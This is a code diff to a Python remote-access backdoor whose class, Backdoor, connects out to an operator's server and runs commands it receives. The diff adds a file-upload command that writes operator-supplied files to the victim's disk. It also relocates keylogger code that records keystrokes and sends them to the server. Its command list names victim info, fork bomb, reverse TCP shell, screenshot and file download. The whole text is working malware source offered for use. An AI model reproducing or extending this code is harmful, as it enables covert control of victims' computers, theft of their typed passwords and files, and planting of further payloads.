@@ -7,6 +7,7 @@ import requests
 import re
 import pyautogui
 import time
+from pynput.keyboard import Listener
 # from pynput.keyboard import Key, Listener
 
 if sys.platform.startswith("Windows"):
@@ -44,28 +45,7 @@ class Backdoor:
             print("\nWrong Input! Exiting...")
             sys.exit()"""
 
-    # OBS: THE 2 BELOW FUNCTIONS IS TO KEYLOGGER, BUT I CAN'T GARANTEE IF IT WILL WORK WITH LARGE RANGES, UNCOMMENT TO TRY IF YOU WANT
-
-    """def keylogger(self, key):
-        current_key = str(key)
-        current_key = re.sub(r"Key.space"," ", current_key) 
-        current_key = re.sub(r"Key.alt_1","\n", current_key)
-        current_key = re.sub(r"Key.*","", current_key)
-        self.count += 1
-        self.keys_list.append(current_key)
-        if self.count >= int(self.range): # Estabilish a range, with sys.argv
-            with open("log.txt","w") as text:  # COUNTS THE LETTERS: IF MORE OR EQUAL TO 10, SEND MESSAGE TO SERVER
-                for keys in self.keys_list:
-                    text.write(keys)
-            with open("log.txt","r") as text2:
-                text_data = text2.read()
-                self.sock.send(text_data.encode())
-                # os.remove("log.txt")
-                # sys.exit()"""
-
-    """def listener(self):
-        with Listener(on_press = self.keylogger) as l: 
-            l.join()"""
+    
 
     def commands_initiating(self):
 
@@ -76,7 +56,7 @@ class Backdoor:
         connected = False
         while (connected == False):
             try:
-                time.sleep(1)
+                time.sleep(2)
                 print('\033[31m[-] *\033[0;0m \033[1;36mInitiating Connection...\033[0;0m')
                 self.sock.connect((self.host, self.port))
                 print('\033[36m[+] *\033[0;0m \033[1;36mConnection estabilished with Sucess!\033[0;0m')
@@ -102,7 +82,7 @@ class Backdoor:
                     sys.exit()
                     
                 try:
-                    not_in = ["get_ip","victims_info","remove_all","keylogger_start","forkbomb","reverse_tcp","download","screenshot","cat"]
+                    not_in = ["get_ip","upload","victims_info","remove_all","keylogger_start","forkbomb","reverse_tcp","download","screenshot","cat"]
 
                     # Get machine's IP adress
 
@@ -127,11 +107,31 @@ class Backdoor:
                         except Exception as e:
                             self.sock.send(str(e).encode())
 
-                        
-                    # Downloading files
+                    # Upload File
+                    if message_command_descrypt.startswith("upload "):
 
-                    if message_command_descrypt == "download":
-                        self.sock.send("You must specify a file!".encode())
+                        up_filename = message_command.split(" ")[1]
+                        
+                        print("\033[0;31m[+]\033[0;0m - Waiting File Size...")
+                    
+                        up_filesize = self.sock.recv(1024).decode("utf-8")
+                        int_filesize = int(up_filesize)
+
+                        print("\033[0;31m[+]\033[0;0m - Receiving Data...\n")
+
+                        up_data = b""
+                        while len(up_data) < int_filesize:
+                            up_data += self.sock.recv(int_filesize)
+        
+                        with open(up_filename,"wb") as sc:
+                            sc.write(up_data)
+
+                        print(f"\033[1;32m[+]\033[0;0m - Uploaded to {up_filename} finished! File Size: {str(int_filesize)} \n\033[1;32m[+]\033[0;0m - Going Back to Input...")
+                        
+                    
+                        
+
+                    # Downloading files
 
                     if message_command_descrypt.startswith("download "):
                         file_name = message_command_descrypt.split(" ")[1]
@@ -246,28 +246,11 @@ class Backdoor:
                     except Exception as e:
                         self.sock.send(str(e).encode())
 
-                # Also, This is for keylogger, to use, uncomment. BUt FIRST, READ DE WARN IN THE TOP OF THE CODE
 
-                """if message_command_descrypt == "keylogger_start":
-                    self.sock.send("You must specify a range! Ex: keylogger_start 20".encode())
 
-                if message_command_descrypt.startswith("keylogger_start "):
-                    self.range = message_command_descrypt.split(" ")[1]
-                    back.listener()"""
-
-                # Remove files
-                
-                """if message_command_descrypt.startswith("rm "):
-                    try:
-                        location = os.getcwd()
-                        os.chdir(location)
-                        self.rmfile = message_command_descrypt.split(" ")[1]
-                        os.remove(self.rmfile)
-                        self.sock.send("Removed file with sucess!".encode())
-                    #except Exception as e:
-                        #self.sock.send(str(e).encode())
-                    except:
-                        continue"""
+                """if message_command_descrypt.startswith("keylogger_start "):
+                    self.rang = message_command_descrypt.split(" ")[1]
+                    self.listener()"""
                                    
 
                 #if message_command_descrypt == "rm":
@@ -297,6 +280,36 @@ class Backdoor:
             except ConnectionResetError:
                 print("\n\033[1;31m[!]\033[0;0m Connection Reseted! Exiting...")
                 sys.exit()
+
+    """def keylogger(self, key):
+        current_key = str(key)
+        current_key = re.sub(r"Key.space"," ", current_key) 
+        current_key = re.sub(r"Key.alt_1","\n", current_key)
+        current_key = re.sub(r"Key.*","", current_key)
+        self.count += 1
+        self.keys_list.append(current_key)
+        if self.count >= int(self.rang): # Estabilish a range, with sys.argv
+            
+            with open("log.txt","w") as text:  # COUNTS THE LETTERS: IF MORE OR EQUAL TO 10, SEND MESSAGE TO SERVER
+                for keys in self.keys_list:
+                    text.write(keys)
+
+            with open("log.txt","r") as text2:
+                text_data = text2.read()
+        
+                keylog_ok = "OK!"
+                self.sock.send(keylog_ok.encode())
+
+                keylog_size = os.path.getsize("log.txt")
+                self.sock.send(str(keylog_size).encode())
+
+                self.sock.send(text_data.encode())
+                # os.remove("log.txt")
+                # sys.exit()
+
+    def listener(self):
+        with Listener(on_press = self.keylogger) as l: 
+            l.join()"""
 
             #self.sock.close()
     def winreg(self,file, path):
